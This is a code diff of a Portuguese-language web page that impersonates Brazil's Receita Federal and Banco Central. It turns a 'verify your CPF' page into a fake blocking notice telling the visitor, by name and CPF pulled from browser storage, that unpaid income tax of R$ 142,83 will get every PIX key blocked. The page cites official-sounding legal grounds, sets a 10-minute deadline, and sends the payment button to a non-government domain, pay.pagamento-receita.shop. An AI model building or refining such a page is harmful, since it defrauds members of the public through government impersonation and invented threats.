@@ -1,32 +1,50 @@
-<!DOCTYPE html><html data-template="verificar-cpf"><head>
+<!DOCTYPE html><html><head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "qkhj9t5mmz");
+    </script>
     <meta charset="utf-8">
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <title>Receita Federal - Verificar CPF</title>
+    <title>TERMO DE NOTIFICAÇÃO DE BLOQUEIO</title>
     <link href="css/all.min.css" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
-       <script
-      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-      data-utmify-prevent-subids
-      async
-      defer
-    ></script>
-    <style>
-        @font-face {
+    <style>@font-face {
             font-family: 'Rawline';
-            src: url("fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            src: url("fonts/rawline-400.ea42a37247439622.woff2.woff2") format('woff2');
             font-weight: 400;
             font-style: normal;
         }
         @font-face {
             font-family: 'Rawline';
-            src: url("fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            src: url("fonts/rawline-400i.1701033bc0b08320.woff2.woff2") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("fonts/rawline-500.f8af4ec801afaa28.woff2.woff2") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("fonts/rawline-600.844a17f0db94d147.woff2.woff2") format('woff2');
             font-weight: 600;
             font-style: normal;
         }
         @font-face {
             font-family: 'Rawline';
-            src: url("fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            src: url("fonts/rawline-700.1c7c76152b40409f.woff2.woff2") format('woff2');
             font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("fonts/rawline-800.5c5f78761d00551b.woff2.woff2") format('woff2');
+            font-weight: 800;
             font-style: normal;
         }
         * {
@@ -40,6 +58,10 @@
             padding-top: 60px;
             color: #333333;
             font-size: 16px;
+            line-height: 1.05;
+        }
+        h3, h4 {
+            font-size: 18px;
             line-height: 1.05;
         }
         .header {
@@ -83,12 +105,15 @@
             display: flex;
             flex-direction: column;
             position: relative;
-            margin: 15px;
+            margin: 15px 0;
             box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
             background-color: white;
             padding: 15px;
             border-radius: 4px;
-            width: calc(100% - 30px);
+            width: 100%;
+        }
+        .user-info:first-of-type {
+            margin-bottom: 30px;
         }
         .user-info-content {
             display: flex;
@@ -109,12 +134,144 @@
             color: #0c326f;
             margin-bottom: 4px;
         }
-        .video-container {
-            position: relative;
-            width: 100%;
-            margin: 8px auto 0;
+        .user-info-image {
+            width: 50px;
+            height: auto;
+            justify-self: end;
+            align-self: start;
+            margin-left: 10px;
+            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
+        }
+        /* Aumentando o espaçamento após os dados do contribuinte */
+        .user-info:nth-of-type(2) .user-info-content {
+            margin-bottom: 35px;
+            padding-bottom: 15px;
+        }
+        .message-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            margin-top: 15px;
+            margin-bottom: 25px;
             border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+        .message-box p {
+            margin-bottom: 8px;
+            width: 100%;
+            font-size: 16px;
+            line-height: 1.45;
+        }
+        .message-box strong {
+            font-weight: 700;
+        }
+        .message-box .red-strong {
+            color: #a71d2a;
+            font-weight: 700;
+        }
+        .tax-details {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            position: relative;
             overflow: hidden;
+        }
+        .tax-details::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            background-image: url('images/Logo_Receita_Federal_do_Brasil.svg');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        .tax-details > * {
+            position: relative;
+            z-index: 1;
+        }
+        .tax-details h4 {
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #0c326f;
+            line-height: 1.45;
+        }
+        .tax-details .document-data {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* Two columns */
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .tax-details .document-data dt {
+            font-weight: 600;
+            text-align: right;
+            padding: 8px 15px;
+            background-color: rgba(248, 249, 250, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            min-width: 80px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dd {
+            font-weight: normal;
+            padding: 8px 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            margin-left: 0;
+            white-space: normal;
+            word-wrap: break-word;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dt,
+        .tax-details .document-data dd {
+            display: flex;
+            align-items: center;
+        }
+        .tax-details .total-value {
+            font-size: 20px;
+            line-height: 1.45;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .regularize-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #28a745 !important;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .regularize-button:hover {
+            background-color: #218838 !important;
+            transform: translateY(-2px);
+        }
+        .news-image {
+            width: 100%;
+            height: auto;
+            margin: 8px auto 0;
+            display: block;
+            border-radius: 4px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         .news-description {
@@ -123,22 +280,6 @@
             padding: 0 4px;
             text-align: justify;
             width: 100%;
-        }
-        .verify-cpf-button {
-            width: 100%;
-            padding: 12px;
-            background-color: #0c326f;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            margin-top: 20px;
-        }
-        .verify-cpf-button:hover {
-            background-color: #092555;
         }
         .footer {
             background-color: #01205B;
@@ -168,23 +309,304 @@
             .header-icon {
                 font-size: 16px;
             }
-            .user-info {
-                margin: 10px;
-                width: calc(100% - 20px);
+            .message-box {
+                width: 100%;
+            }
+            .news-image {
+                max-width: 100%;
+            }
+            .news-description {
+                margin-left: 0;
             }
         }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background-color: white;
+            width: 95%;
+            max-width: 500px;
+            position: absolute;
+            top: 50%;
+            left: 47%;
+            transform: translate(-50%, -50%);
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-header {
+            text-align: left;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .modal-logo {
+            width: 160px;
+            height: auto;
+            margin: 0;
+            display: block;
+        }
+
+        /* QR Code Container */
+        .qr-code-container {
+            text-align: left;
+            padding: 15px 0;
+        }
+
+        .qr-code-img {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 15px;
+        }
+
+        .customer-info {
+            background-color: #f8f9fa;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            border-left: 4px solid #0c326f;
+            text-align: left;
+        }
+
+        .customer-info p {
+            margin: 3px 0;
+            color: #333;
+            text-align: left;
+        }
+
+        .customer-info .total-amount {
+            color: #dc3545;
+            font-weight: 700;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+
+        .warning-text {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 12px;
+            border-radius: 4px;
+            margin: 12px 0 0 0;
+            font-weight: 500;
+        }
+
+
+        .pix-code-container {
+            background-color: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 12px 0;
+        }
+
+        .pix-code {
+            font-family: monospace;
+            word-break: break-all;
+            margin: 0;
+            padding: 8px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .copy-button-container {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .copy-pix-button {
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
+        }
+
+        .copy-pix-button:hover {
+            background-color: #092555;
+        }
+
+        /* Modal no mobile */
+        @media (max-width: 600px) {
+            .modal-content {
+                margin: 40px 15px;
+                padding: 20px;
+            }
+        }
+
+        /* Script JavaScript adicional para o cronômetro */
+        @keyframes copy-feedback {
+            0% { background-color: #0c326f; }
+            50% { background-color: #28a745; }
+            100% { background-color: #0c326f; }
+        }
+
+        .copy-success {
+            animation: copy-feedback 1s ease;
+        }
+
+        /* Loader Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(12, 50, 111, 0.1);
+            border-radius: 50%;
+            border-top-color: #0c326f;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loader-text {
+            color: #0c326f;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        .banco-central-termo {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #0c326f;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #28a745;
+        }
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        .switch-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 8px;
+            margin: 15px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #dc35451a;
+        }
+        .switch-container.shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        .term-title {
+            font-weight: 600;
+            color: #0c326f;
+            margin-bottom: 15px;
+            text-align: left;
+            font-size: 18px;
+        }
+        .term-content {
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .term-content p {
+            margin-bottom: 15px;
+            padding-right: 10px;
+        }
+        .term-list {
+            list-style: disc;
+            margin-left: 25px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .term-list li {
+            margin-bottom: 6px;
+        }
+        /* Modal de Pagamento */
+        #paymentModal .modal-header {
+            text-align: left;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        #paymentModal .modal-logo {
+            width: 160px;
+            height: auto;
+            margin: 0;
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+
+        /*Removed @keyframes pulse*/
+
     </style>
-    
-    <!-- Google Tag Manager -->
-<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-})(window,document,'script','dataLayer','GTM-KW8J56Z3');</script>
-<!-- End Google Tag Manager -->
-    
 </head>
-<body class="verificar-cpf-page">
+<body>
     <div class="header">
         <img alt="Logo da Receita Federal" class="logo" src="images/receitaAzul.svg">
         <div class="header-icons">
@@ -195,136 +617,257 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     </div>
 
     <div class="hero-image">
-        <img alt="Aviso sobre novas regras do PIX" src="images/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-2.png">
+        <img alt="Aviso sobre novas regras do PIX" src="images/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-1-1.png">
     </div>
 
     <div class="user-info">
         <div class="user-info-content">
             <div class="user-info-text">
-                <h3>Notícia na mídia</h3>
-                <p><strong>Programa:</strong> Jornal da Band</p>
-                <p><strong>Data:</strong> 05 de março de 2025</p>
+                <h3 style="text-align: center;">TERMO DE NOTIFICAÇÃO DE BLOQUEIO</h3>
+                <div style="margin-top: 15px; line-height: 1.6;">
+                    <p>O <strong>Banco Central do Brasil</strong>, no uso de suas atribuições legais, com fundamento na <strong>Lei nº 14.459/2022</strong> e na <strong>Resolução BCB nº 202/2022</strong>, que regulamentam o funcionamento do Sistema de Pagamentos Instantâneos (PIX), notifica o contribuinte <strong data-user="nome"></strong>, portador do CPF <strong data-user="cpf"></strong>, que em virtude das irregularidades fiscais identificadas junto à Receita Federal do Brasil, referentes aos exercícios de <strong>2023 e 2024</strong>, todas as <strong>chaves PIX</strong> vinculadas ao CPF supracitado serão <strong>BLOQUEADAS</strong> para operações de envio e recebimento de valores, caso as pendências não sejam regularizadas no prazo estabelecido.</p>
+
+                    <p style="margin-top: 15px;">Brasília, 08/03/2025</p>
+                    <p><strong>BANCO CENTRAL DO BRASIL</strong></p>
+                </div>
             </div>
         </div>
     </div>
-
-    <style>
-        .frame
-        {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        /* Estilizando o container do vídeo para encaixar perfeitamente */
-        .video-container {
-            position: relative;
-            width: 90%;
-            margin: 0;
-            padding: 0;
-            background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden; /* Evita qualquer transbordamento */
-            border-radius: 15px; /* Arredonda os cantos */
-        }
-
-        /* Estilo do vídeo */
-        .video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover; /* Preenche o contêiner sem distorcer o vídeo */
-            border-radius: 15px; /* Arredonda os cantos do vídeo */
-        }
-
-        /* Botão de mute/desmute */
-        .mute-button {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.5);
-            color: white;
-            border: none;
-            padding: 15px;
-            font-size: 24px;
-            border-radius: 50%;
-            cursor: pointer;
-            opacity: 0.7;
-            transition: opacity 0.3s ease;
-        }
-
-        .mute-button:hover {
-            opacity: 1;
-        }
-
-    </style>
-    
-    <div class="frame">
-        <div class="video-container">
-        <video class="video" autoplay muted playsinline id="myVideo">
-            <source src="./video/receita.mp4" type="video/mp4">
-            <source src="./video/receita.mp4" type="video/webm">
-            <source src="./video/receita.mp4" type="video/ogg">
-            Seu navegador não suporta a tag de vídeo.
-        </video>
-
-        <button class="mute-button" id="unmuteButton" onclick="toggleMute(true)">
-            🔊
-            <p style="font-size: 10px; margin: 0;">Clique para Ouvir</p>
-        </button>
-
-        <button class="mute-button" id="muteButton" style="display: none;" onclick="toggleMute(false)">
-            🔇
-            <p style="font-size: 10px; margin: 0;">Clique para Mutar</p>
-        </button>
-    </div>
-    </div>
-
-    <script>
-        var firstUnmuteClick = true;
-
-        function toggleMute(isUnmuting) {
-            var video = document.getElementById("myVideo");
-            var unmuteButton = document.getElementById("unmuteButton");
-            var muteButton = document.getElementById("muteButton");
-
-            if (isUnmuting) {
-                video.muted = false;
-                if (firstUnmuteClick) {
-                    video.currentTime = 0;
-                    firstUnmuteClick = false;
-                }
-                unmuteButton.style.display = "none";
-                muteButton.style.display = "block";
-            } else {
-                video.muted = true;
-                muteButton.style.display = "none";
-                unmuteButton.style.display = "block";
-            }
-        }
-    </script>
-
     <div class="user-info">
-        <p class="news-description">
-            De acordo com as novas diretrizes do Banco Central, todas as chaves PIX vinculadas a CPFs com pendências tributárias poderão ser bloqueadas para transferências. Esta medida visa garantir a conformidade fiscal e a segurança do sistema financeiro nacional. Para regularizar sua situação e evitar o bloqueio de suas chaves PIX, insira seu CPF abaixo e verifique se há pendências em seu cadastro.
-        </p>
-        <a href="/buscar-cpf">
-            <button class="verify-cpf-button">
-            Verificar meu CPF
-        </button>
-        </a>
-        
-    </div>
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>DADOS DO DEVEDOR</h3>
+                    <p><strong>NOME:</strong> <span data-user="nome"></span></p>
+                    <p><strong>CPF:</strong> <strong data-user="cpf"></strong></p>
+                </div>
+                <img src="images/download-1.png" alt="User profile icon" class="user-info-image">
+            </div>
+            <div class="message-box">
+                <p><span class="red-strong">Atenção </span><span data-user="nome"></span><span>: </span>Há inconsistências no imposto de renda de <strong>2023 e 2024.</strong> Conforme as novas regras do PIX, <span class="red-strong">todas as chaves PIX vinculadas ao seu CPF</span> serão bloqueadas se as pendências não forem pagas. Isso inclui <strong>todas as suas contas bancárias.</strong></p>
+            </div>
+            <div class="tax-details">
+                <h4>Valores não pagos do Imposto de Renda de Pessoa Física:</h4>
+                <dl class="document-data">
+                    <dt>Nome:</dt>
+                    <dd><span data-user="nome"></span></dd>
+                    <dt>CPF:</dt>
+                    <dd><span data-user="cpf"></span></dd>
+                    <dt>Ano</dt>
+                    <dd>Valor</dd>
+                    <dt>2023:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;">R$ 47,61</strong>
+                    </dd>
+                </dl>
+                <div style="background-color: #ffebeb; border: 1px solid #dc3545; color: #721c24; padding: 10px; margin: 8px 0; border-radius: 4px; line-height: 1.4; white-space: normal; word-wrap: break-word; width:100%;">
+                    • Multa por atraso na declaração de renda<br>
+                    • Inconsistências nos valores declarados
+                </div>
+                <dl class="document-data">
+                    <dt>2024:</dt>
+                    <dd>
+                        <strong style="font-size: 16px;">R$ 94,22</strong>
+                    </dd>
+                </dl>
+                <div style="background-color: #ffebeb; border: 1px solid #dc3545; color: #721c24; padding: 10px; margin: 8px 0; border-radius: 4px; line-height: 1.4; white-space: normal; word-wrap: break-word; width:100%;">
+                    • Movimentações financeiras incompatíveis<br>
+                    • Transações não declaradas identificadas
+                </div>
+                <p class="total-value"><strong>Total devido: R$ 142,83</strong></p>
+                <p>Para evitar a suspensão do PIX em todas as contas bancárias vinculadas ao CPF <strong data-user="cpf"></strong>, é obrigatório efetuar o pagamento deste valor imediatamente.</p>
 
+                <div class="banco-central-termo">
+                    <div class="term-title">TERMO DE CIÊNCIA E ACORDO</div>
+                    <div class="term-content">
+                        <p>
+                            Eu, <strong data-user="nome"></strong>, portador do CPF <strong data-user="cpf"></strong>, 
+                            declaro estar ciente que:
+                        </p>
+                        <ul class="term-list">
+                            <li>O pagamento deve ser realizado em até <strong>10 minutos</strong> após a geração do PIX;</li>
+                            <li>Caso o pagamento não seja realizado dentro do prazo, autorizo o bloqueio imediato de todas as minhas chaves PIX em todas as instituições financeiras;</li>
+                            <li>Em caso de não pagamento, além do bloqueio das chaves PIX, serão aplicadas multas adicionais e juros sobre o valor devido;</li>
+                            <li>A regularização só será efetivada mediante concordância com estes termos e pagamento dentro do prazo estipulado.</li>
+                        </ul>
+                    </div>
+                    <div class="switch-container">
+                        <label class="switch">
+                            <input type="checkbox" id="termsToggle">
+                            <span class="slider"></span>
+                        </label>
+                        <span style="font-size: 14px; color: #666;">Clique no botão acima para aceitar os termos e condições. Após aceitar, clique no botão "Regularizar agora" abaixo para prosseguir</span>
+                    </div>
+                </div>
+
+                <button class="regularize-button" id="regularizeButton" style="opacity: 0.5; cursor: not-allowed;" disabled="">
+                    <i class="fas fa-exclamation-triangle" id="regularizeIcon"></i>
+                    <span id="regularizeText">Regularizar agora</span>
+                </button>
+            </div>
+        </div>
     <footer class="footer">
         <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
         <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
     </footer>
-    
-    <!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KW8J56Z3"
-height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-<!-- End Google Tag Manager (noscript) -->
-    
-</body></html>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get user data from localStorage
+            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":""}');
+            console.log('Loading from localStorage:', userData);
+
+            // Update all elements with data-user="nome"
+            document.querySelectorAll('[data-user="nome"]').forEach(element => {
+                element.textContent = userData.nome;
+            });
+
+            // Update all elements with data-user="cpf"
+            document.querySelectorAll('[data-user="cpf"]').forEach(element => {
+                element.textContent = userData.cpf;
+            });
+
+            // Controle do toggle e botão
+            const termsToggle = document.getElementById('termsToggle');
+            const regularizeButton = document.getElementById('regularizeButton');
+
+            termsToggle.addEventListener('change', function() {
+                regularizeButton.disabled = !this.checked;
+                regularizeButton.style.opacity = this.checked ? '1' : '0.5';
+                regularizeButton.style.cursor = this.checked ? 'pointer' : 'not-allowed';
+            });
+
+            // Add click handler for "Regularizar agora" button
+            if (regularizeButton) {
+                regularizeButton.addEventListener('click', function(e) {
+                    const termsToggle = document.getElementById('termsToggle');
+                    const switchContainer = document.querySelector('.switch-container');
+
+                    if (!termsToggle.checked) {
+                        e.preventDefault();
+                        switchContainer.classList.remove('shake');
+                        void switchContainer.offsetWidth; // Trigger reflow
+                        switchContainer.classList.add('shake');
+                        return;
+                    }
+
+                    if (this.disabled) return;
+
+                    e.preventDefault();
+                    // Disable button and change text
+                    this.disabled = true;
+                    const icon = document.getElementById('regularizeIcon');
+                    const text = document.getElementById('regularizeText');
+                    icon.className = 'fas fa-spinner fa-spin';
+                    text.textContent = 'Gerando cobrança...';
+                    this.style.backgroundColor = '#1a532e !important';
+
+                    const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","phone":""}');
+                    // Add small delay to show the loading state
+                    setTimeout(() => {
+                        window.location.href = `https://pay.pagamento-receita.shop/6YQPgjJ8aY6gpxz`;
+                    }, 1000);
+                });
+            }
+            const video = document.getElementById('newsVideo');
+            const soundButton = document.getElementById('soundButton');
+
+            if (video) {
+                video.addEventListener('click', function() {
+                    if (video.paused) {
+                        video.play();
+                        if (video.muted) {
+                            soundButton.style.display = 'flex';                        }
+                    } else {
+                        video.pause();
+                        soundButton.style.display = 'flex';
+                    }
+                });
+            }
+
+            if (soundButton) {
+                soundButton.addEventListener('click', function() {
+                    video.currentTime = 0;
+                    video.muted = false;
+                    video.play();
+                    soundButton.style.display = 'none';
+                });
+            }
+
+            if (video) {
+                video.addEventListener('ended', function() {
+                    video.pause();
+                    video.muted = true;
+                    soundButton.style.display = 'flex';
+                });
+            }
+        });
+
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode').textContent;
+            const copyButton = document.querySelector('.copy-pix-button');
+
+            navigator.clipboard.writeText(pixCode).then(() => {
+                copyButton.classList.add('copy-success');
+                copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                setTimeout(() => {
+                    copyButton.classList.remove('copy-success');
+                    copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
+                }, 2000);
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+            });
+        }
+
+        // Adicionar evento de clique no botão "Regularizar agora"
+
+
+        // Fechar modal ao clicar fora
+        window.onclick = function(event) {
+            const modal = document.getElementById('paymentModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+    <!-- Modal de Pagamento -->
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="images/receita-federal-logo.png" alt="Logo Receita Federal" class="modal-logo">
+            </div>
+            <div id="loaderContainer" class="loader-container">
+                <div class="loader"></div>
+                <p class="loader-text">Gerando termo de compromisso...</p>
+            </div>
+            <div><div id="qrCodeContainer" class="qr-code-container">
+                <p class="term-title">TERMO DE COMPROMISSO - BANCO CENTRAL DO BRASIL</p>
+                <div class="term-content">
+                    <p>
+                        Eu, <strong data-user="nome"></strong>, portador do CPF <strong data-user="cpf"></strong>, 
+                        declaro estar ciente que devo realizar o pagamento no valor de <strong>R$ 142,83</strong>, 
+                        sob pena de:
+                    </p>
+                    <ul class="term-list">
+                        <li>Cancelamento imediato deste acordo</li>
+                        <li>Bloqueio de todas as chaves PIX vinculadas ao meu CPF</li>
+                        <li>Aplicação de multas adicionais</li>
+                    </ul>
+                </div>
+
+                <div class="switch-container">
+                    <label class="switch">
+                        <input type="checkbox" id="termsToggle">
+                        <span class="slider"></span>
+                    </label>
+                    <span style="font-size: 14px; color: #666;">Clique no botão acima para aceitar o acordo de liberação do seu CPF</span>
+                </div>
+
+                <button id="proceedButton" class="regularize-button" style="opacity: 0.5; cursor: not-allowed;" disabled="">
+                    <i class="fas fa-shield-alt"></i>
+                    Evitar Bloqueio do CPF
+                </button>
+            </div>
+        </div>
+    </div>
+
+</div></body></html>
